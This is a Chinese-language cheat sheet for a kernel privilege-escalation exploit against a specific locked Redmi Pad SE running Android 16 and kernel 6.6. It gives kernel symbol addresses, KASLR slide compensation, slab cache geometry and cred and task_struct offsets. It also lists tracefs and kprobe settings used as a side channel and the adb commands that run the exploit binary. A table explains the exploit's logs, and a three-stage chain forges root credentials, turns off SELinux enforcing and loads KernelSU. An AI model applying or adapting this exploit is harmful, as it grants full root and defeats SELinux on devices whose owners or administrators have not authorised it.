# 速查卡

[中文](CHEATSHEET.md) · [English](en/CHEATSHEET.md)

> 一页纸版本。打印出来贴在显示器边上的那种。

---

## 设备

```
Redmi Pad SE 8.7  ·  flare  ·  24075RP89G
SoC       MT8786V/N
ROM       HyperOS OS3.0.303.0.WHXMIXM
Android   16  (BP2A.250605.031.A3)
Kernel    6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
SPL       2026-09-01
BL        locked / verifiedbootstate=green
```

---

## 关键常量（从本机实测）

### 符号地址（链接时，需 +slide）

| 符号 | 链接地址 |
|---|---|
| `selinux_state` | `0xffffffc08236a2e0` |
| `panic_on_warn` | `0xffffffc08211ae0c` |
| `root_user` | `0xffffffc08213f1e0` |
| `init_user_ns` | `0xffffffc08213ef50` |
| `init_ucounts` | `0xffffffc082140cb0` |
| `init_groups` | `0xffffffc082140740` |
| `do_timer_create+0xa8` | `0xffffffc080195d48` |
| `copy_process+0x140` | `0xffffffc0800ab93c` |
| `prepare_creds+0x24` | `0xffffffc0800e4064` |

### 低 21 位（★ 必须加 slide 补偿！）

```
timer_low21  = 0x195d48     运行时: (0x195d48 + 0x80000) & 0x1fffff = 0x15d48
copy_low21   = 0x0ab93c     运行时: (0xab93c  + 0x80000) & 0x1fffff = 0x12b93c
```

**我们这台机器 `slide & 0x1fffff = 0x80000`（512 KB 对齐，不是 2 MiB）**

### slab 几何

| cache | objsize | 每 slab | order |
|---|---|---|---|
| `posix_timers_cache` | **264** | **31** | **1 (8 KB)** |
| `cred_jar` | **192** | 21 | 0 |
| `task_struct` | **4800** | 6 | 3 |

```
sizeof(cred)            = 0xb8 (184)
cred 的 bytes_alloc      = 0xc0 (192)
```

### 结构体偏移

```
task_struct.cred        0x820
task_struct.real_cred   0x828

cred.uid / gid          0x08      (两个 u32)
cred.suid / sgid        0x10
cred.euid / egid        0x18
cred.fsuid / fsgid      0x20
cred.cap_inheritable    0x30
cred.cap_permitted      0x38
cred.cap_effective      0x40
cred.cap_bset           0x48
cred.cap_ambient        0x50
cred.security           0x80      SELinux blob
cred.user               0x88
cred.user_ns            0x90
cred.ucounts            0x98
cred.group_info         0xA0

k_itimer.it (union)     0x78
  .cpu.node             0x00      → rb_node @ 0x78  ← 这就是 KITIMER_NODE

struct page 大小        0x40 (64)
```

### 完整能力集

```
0x1ffffffffff     = 41 位全 1
CapPrm = CapEff = CapBnd = 0x1ffffffffff
```

---

## tracefs

```
/sys/kernel/tracing/tracing_on                          0666  可写
/sys/kernel/tracing/trace                               0666  可读写
/sys/kernel/tracing/buffer_size_kb                      0666  可写
/sys/kernel/tracing/events/*/enable                     0666  可写
/sys/kernel/tracing/kprobe_events                       0777
/sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw         0640  readtracefs 组可读 ★
```

**文本 `trace` 的指针被 `%pK` hash 过；`trace_pipe_raw` 是真实指针。**

### 事件 ID（本机推断值）

```
kmem:mm_page_alloc          275
kmem:mm_page_free           273
sched:sched_blocked_reason  109   raw 偏移 16 = void* caller
```

### kprobe 写法

```
p:grp/free_slab free_slab cache=%x0:x64 slab=%x1:x64
r:grp/folio    __filemap_get_folio folio=$retval:x64
```

`free_slab(x0 = kmem_cache*, x1 = slab*)` —— 已用反汇编确认参数顺序。

**★ EXACT HIT 简化判据（不需要 vmemmap 换算）：**

```c
命中 = (folio == slab) || (folio == slab + 64)
//  前半页           后半页
// 哪一半由 (victim & 0x1fff) >= 4096 决定
```

---

## 命令

### 自检（零风险）

```bash
adb shell '/data/local/tmp/shark66118 probe'
```

期望：

```
PROBE_TIMER made=128 recs=128 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] best=0xffffff7fc0000000 count=330
[cred] task=... task_recs=1
PROBE_OK
```

### 开打

```bash
adb shell "cd /data/local/tmp && \
  PYB110_KSUD=/data/local/tmp/ksud33 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KMI=android15-6.6 \
  ./shark66118 --auto"
```

### 验证

```bash
adb shell grep kernelsu /proc/modules          # kernelsu ... Live
adb shell su -c id                             # uid=0 ... u:r:ksu:s0
adb shell su -c 'grep Cap /proc/self/status'   # 0x1ffffffffff
```

### 恢复

```bash
adb reboot
```

---

## 日志速查

| 日志 | 含义 | 动作 |
|---|---|---|
| `free_seen=1 burst hit=1` | 精确命中 | 继续，会 reap |
| `free_seen=1 burst hit=0` | 释放看到但没抢到 | `PARKED`，重跑 |
| `free_seen=0` | 没看到释放 | 检查探针/触发 |
| `holding zombie` | 保留僵尸 | 正常，下次可继续 |
| `PARKED=1` | 已 park | 重跑 |
| `PLANT_CRED_OK` | cred 阶段成功 | |
| `LATE_LOAD_RC=0` | KSU 加载成功 | |
| `LATE_LOAD_SKIP=env-missing` | 没设 `PYB110_KSUD` | 补环境变量 |
| `[calib] timers=0` | **KASLR 低21位没补偿** | 见 09 章 |
| `task_recs=0` 但 `recs=1` | 同上 | 同上 |
| `FAIL=fake-uid` | 第三阶段没命中 | 重跑 |

---

## 症状 → 病因

| 症状 | 病因 |
|---|---|
| `timers=0` / `task_recs=0` | KASLR 对齐（低21位） |
| `uid=0` 但 `CapEff=0` | 用了默认模式不是 fake 模式 |
| `su: not found` | KSU 模块没加载 |
| `LATE_LOAD_RC≠0` | ksud 和管理器版本不匹配 |
| `io_setup` EACCES | SELinux Enforcing，需要 Permissive |
| 程序卡住 | pipe `write` 阻塞 / trace 没关 |
| 设备掉线 | panic，等 30–60 秒自动回来 |
| trace 里 ptr 是 hash 的 | 用了文本 `trace`，要用 `trace_pipe_raw` |

---

## 三段链条

```
① fake_cred
   抢回收页面 → 铺假 cred（uid=0 + 0x1ffffffffff 全套）
   → 零写 task->cred (task+0x820) 指向它
   → 子进程 fork，prepare_creds() 洗一遍，分配真实 SELinux blob

② selinux
   → 零写 selinux_state.enforcing
   → getenforce 变 Permissive

③ fake_uid
   → 零写 假cred+0x08 (uid/gid)
   → resuid = 0/0/0
   → ksud late-load 加载 KernelSU

每步都要一次 burst hit=1
```

---

## 能力集速记

| 值 | 含义 |
|---|---|
| `CapEff = 0x1ffffffffff` | 完整（root） |
| `CapEff = 0` | 空 —— **uid=0 也做不了事** |
| `CAP_DAC_OVERRIDE` = bit 1 | 读写任意文件 |
| `CAP_SYS_ADMIN` = bit 21 | `setenforce` / `insmod` / mount |

**判据：`su -c 'grep Cap /proc/self/status'` 看 `CapEff`，别看 `id`。**
